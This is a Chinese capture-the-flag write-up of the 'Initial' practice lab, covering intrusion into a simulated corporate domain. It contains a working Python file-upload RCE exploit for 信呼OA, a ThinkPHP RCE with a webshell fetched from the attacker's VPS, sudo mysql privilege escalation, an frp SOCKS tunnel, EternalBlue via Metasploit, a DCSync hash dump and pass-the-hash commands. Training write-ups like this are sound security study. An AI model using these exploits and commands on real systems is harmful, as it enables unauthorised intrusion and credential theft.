# 春秋云境-Initial综合渗透


春秋云境-Initial综合渗透通关wp

<!--more-->

![image-20250112122646640](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112122646640.png?imageSlim)

靶标介绍：Initial是一套难度为简单的靶场环境，完成该挑战可以帮助玩家初步认识内网渗透的简单流程。该靶场只有一个flag，各部分位于不同的机器上。

* DCSync
* CVE
* 域渗透

## 外网打点

起手fscan

```bash
E:\Tools\web\fscan_v1.82>fscan64.exe -h 39.98.121.15

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
(icmp) Target 39.98.121.15    is alive
[*] Icmp alive hosts len is: 1
39.98.121.15:22 open
39.98.121.15:80 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle: http://39.98.121.15       code:200 len:5578   title:Bootstrap Material Admin
[+] http://39.98.121.15 poc-yaml-thinkphp5023-method-rce poc1
已完成 2/2
```

发现thinkphp的rce漏洞

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112101338-r1pd7ew.png?imageSlim)

直接getshell发现回连不成功

在vps上起http.server，靶机执行wget下载冰蝎马

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112102552-0a82dr4.png?imageSlim)

连接成功

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112102639-9d8c9or.png?imageSlim)​

### 提权

但权限比较低，尝试提权

```bash
/var/www/html/ >whoami
www-data

/var/www/html/ >
```

上传信息收集脚本LinEnum.sh并执行，发现了有sudo提权，命令是mysql

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112110054-vkf7jvj.png?imageSlim)​

去[GTFOBins](https://gtfobins.github.io/)查一下

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112110459-l9pzh5n.png?imageSlim)​

```bash
sudo mysql -e '\! /bin/sh'
```

随后

```bash
find / -name *flag*
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112110757-igbeemc.png?imageSlim)​

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112110733-q89g68e.png?imageSlim)​

### flag01

 flag{60b53231-

## 内网渗透

### 信息收集

```bash
www-data@ubuntu-web01:/var/www/html$ ifconfig
ifconfig
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.1.15  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe04:448  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:04:04:48  txqueuelen 1000  (Ethernet)
        RX packets 127464  bytes 159592057 (159.5 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 34792  bytes 14822017 (14.8 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2048  bytes 173247 (173.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2048  bytes 173247 (173.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

```

fscan

```bash
www-data@ubuntu-web01:/var/www/html$ ./fscan -h 172.22.1.15/24
./fscan -h 172.22.1.15/24

   ___                              _  
  / _ \     ___  ___ _ __ __ _  ___| | __ 
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <  
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.4
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 172.22.1.2      is alive
(icmp) Target 172.22.1.15     is alive
(icmp) Target 172.22.1.18     is alive
(icmp) Target 172.22.1.21     is alive
[*] Icmp alive hosts len is: 4
172.22.1.2:88 open
172.22.1.2:135 open
172.22.1.18:3306 open
172.22.1.18:80 open
172.22.1.21:445 open
172.22.1.15:80 open
172.22.1.18:445 open
172.22.1.2:445 open
172.22.1.15:22 open
172.22.1.21:139 open
172.22.1.18:139 open
172.22.1.2:139 open
172.22.1.21:135 open
172.22.1.18:135 open
[*] alive ports len is: 14
start vulscan
[*] NetInfo 
[*]172.22.1.21
   [->]XIAORANG-WIN7
   [->]172.22.1.21
[*] NetInfo 
[*]172.22.1.18
   [->]XIAORANG-OA01
   [->]172.22.1.18
[*] NetInfo 
[*]172.22.1.2
   [->]DC01
   [->]172.22.1.2
[*] WebTitle http://172.22.1.15        code:200 len:5578   title:Bootstrap Material Admin
[*] NetBios 172.22.1.2      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393
[*] OsInfo 172.22.1.2   (Windows Server 2016 Datacenter 14393)
[+] MS17-010 172.22.1.21        (Windows Server 2008 R2 Enterprise 7601 Service Pack 1)
[*] NetBios 172.22.1.21     XIAORANG-WIN7.xiaorang.lab          Windows Server 2008 R2 Enterprise 7601 Service Pack 1
[*] NetBios 172.22.1.18     XIAORANG-OA01.xiaorang.lab          Windows Server 2012 R2 Datacenter 9600
[*] WebTitle http://172.22.1.18        code:302 len:0      title:None 跳转url: http://172.22.1.18?m=login
[*] WebTitle http://172.22.1.18?m=login code:200 len:4012   title:信呼协同办公系统
[+] PocScan http://172.22.1.15 poc-yaml-thinkphp5023-method-rce poc1
已完成 14/14
```

该内网网段有四台主机，其中一台已被拿下，另外三台

```bash
172.22.1.2   DC 
172.22.1.21  MS17-010 
172.22.1.18  信呼OA
```

接下来先打信呼OA，我们接下来上传frp到主机上，让内网的流量转发出来。

### frp穿透

vps frps.ini

```ini
[common]
bind_port = 7000
```

‍

靶机 frpc.ini

```ini
[common]
server_addr = vps.ip
server_port = 7000

[socks5]
type = tcp
remote_port = 6000
plugin = socks5
```

‍

本地proxifier

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112113155-pvmiqj8.png?imageSlim)​

### 信呼协同办公系统漏洞利用

现存漏洞可搜

[[代码审计]信呼协同办公系统2.2存在文件上传配合云处理函数组合拳RCE_信呼协同办公系统弱口令-CSDN博客](https://blog.csdn.net/solitudi/article/details/118675321)

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112112154-0mlix75.png?imageSlim)​

利用exp：

```bash
import requests
session = requests.session()
url_pre = 'http://172.22.1.18/'
url1 = url_pre + '?a=check&m=login&d=&ajaxbool=true&rnd=533953'
url2 = url_pre + '/index.php?a=upfile&m=upload&d=public&maxsize=100&ajaxbool=true&rnd=798913'
url3 = url_pre + '/task.php?m=qcloudCos|runt&a=run&fileid=11'
data1 = {
    'rempass': '0',
    'jmpass': 'false',
    'device': '1625884034525',
    'ltype': '0',
    'adminuser': 'YWRtaW4=',
    'adminpass': 'YWRtaW4xMjM=',
    'yanzm': ''
}
r = session.post(url1, data=data1)
r = session.post(url2, files={'file': open('1.php', 'br+')})

filepath = str(r.json()['filepath'])
filepath = "/" + filepath.split('.uptemp')[0] + '.php'
id = r.json()['id']
url3 = url_pre + f'/task.php?m=qcloudCos|runt&a=run&fileid={id}'
r = session.get(url3)
r = session.get(url_pre + filepath + "?1=system('dir")
print(r.text)
print(filepath)
```

上面的adminuser和adminpass都是base64编码过后的，然后我们再在同级目录下来个要上传的木马，命名为1.php，直接运行脚本，然后拿到返回的路径，直接连behinder。

```bash
PS C:\Users\scofi\Desktop> python solve.py
<br />
<b>Notice</b>:  Undefined offset: 1 in <b>C:\phpStudy\PHPTutorial\WWW\upload\2025-01\12_11282757.php</b> on line <b>23</b><br />

/upload/2025-01/12_11282757.php
```

upload\2025-01\12_11282757.php

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112113132-eukvnkm.png?imageSlim)​

文件管理

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112113448-klmy3qn.png?imageSlim)​

### flag02

2ce3-4813-87d4-

根据提示，接下来打DC

### DC域控渗透

配置kali vm的proxychains4

```bash
nano /etc/proxychains4.conf
```

我的vm用的是NAT网络模式，添加

```bash
socks5 vps_ip 6000
```

同时模式为`dynamic_chain`​

随后使用msf

```bash
proxychains msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set payload windows/x64/meterpreter/bind_tcp
show options 
set rhosts 172.22.1.21
run
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112121045-qmbybnn.png?imageSlim)​

成功拿到shell，开始横向

```bash
load kiwi
kiwi_cmd lsadump::dcsync /domain:xiaorang.lab /all /csv
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112121723-1vp21xi.png?imageSlim)​

导出hash

```bash
[DC] 'xiaorang.lab' will be the domain
[DC] 'DC01.xiaorang.lab' will be the DC server
[DC] Exporting domain 'xiaorang.lab'
[rpc] Service  : ldap
[rpc] AuthnSvc : GSS_NEGOTIATE (9)
502     krbtgt  fb812eea13a18b7fcdb8e6d67ddc205b        514
1106    Marcus  e07510a4284b3c97c8e7dee970918c5c        512
1107    Charles f6a9881cd5ae709abb4ac9ab87f24617        512
500     Administrator   10cf89a850fb1cdbe6bb432b859164c8        512
1000    DC01$   d75bd2d4524fcaee3946250f675aebf7        532480
1108    XIAORANG-WIN7$  8b7dea43bed4b560504e925f0f1b5efd        4096
1104    XIAORANG-OA01$  fd2dbb99c526e5969d540669a099d158        4096
```

hash传递，拿flag

```bash
proxychains crackmapexec smb 172.22.1.2 -u administrator -H10cf89a850fb1cdbe6bb432b859164c8 -d xiaorang.lab -x "type Users\Administrator\flag\flag03.txt"
```

![image](https://scofield-1313710994.cos.ap-beijing.myqcloud.com/image-20250112121505-z7e94uy.png?imageSlim)​

### flag03

e8f88d0d43d6}

最终的flag

```bash
flag{60b53231-2ce3-4813-87d4-e8f88d0d43d6}
```

